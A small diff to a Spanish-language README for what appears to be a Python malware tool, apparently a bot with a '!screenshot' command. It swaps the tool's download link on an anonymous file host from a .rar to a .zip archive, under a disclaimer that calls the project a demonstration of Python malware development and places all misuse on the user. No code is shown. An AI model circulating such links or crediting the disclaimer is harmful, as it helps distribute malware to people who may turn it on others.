@@ -123,7 +123,7 @@ Comando: **!screenshot**
 > [!CAUTION]
 > Al utilizar este software, usted acepta los términos y condiciones establecidos. En consecuencia, cualquier uso indebido de este software será de exclusiva responsabilidad del usuario final, y no del autor. Este proyecto tiene como objetivo inicial demostrar las capacidades de Python como herramienta para el desarrollo de malware en entornos controlados. 
 
-⬇️ **Download:** https://anonymfile.com/xJD0W/purge.rar
+⬇️ **Download:** https://anonymfile.com/orm7D/purge.zip
 
 <h1 align="center"></h1>
 
